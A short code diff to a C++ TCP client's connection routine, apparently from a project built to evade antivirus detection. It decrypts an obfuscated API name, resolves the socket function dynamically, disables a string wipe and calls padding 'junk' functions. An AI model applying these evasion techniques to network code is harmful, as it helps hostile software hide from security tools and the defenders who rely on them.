@@ -28,17 +28,17 @@ int TCPClient::start_connection()
 
 	small_junk();
 
-	std::string socket_string = reencrypt_and_decrypt(str_socket, str_socket_len);
+	std::string socket_string = string_decrypt(str_socket, str_socket_len);
 		
 	// Create Socket
-	this->sock = resolve_dynamically<socket_t>("socket", WS2_32_STR)(AF_INET, SOCK_STREAM, 0);
+	this->sock = resolve_dynamically<socket_t>(socket_string.c_str(), WS2_32_STR)(AF_INET, SOCK_STREAM, 0);
 	// Decrypt (get a local copy of the decrypted string) -> Use -> Wipe it
 	if (sock == INVALID_SOCKET)
 	{
 		std::cerr << "Error creating socket, Err #" << resolve_dynamically<WSAGetLastError_t>("WSAGetLastError", WS2_32_STR)() << std::endl;
 		return -1;
 	}
-	wipeStr(socket_string);
+	//wipeStr(socket_string);
 
 	suspicious_junk_2();
 
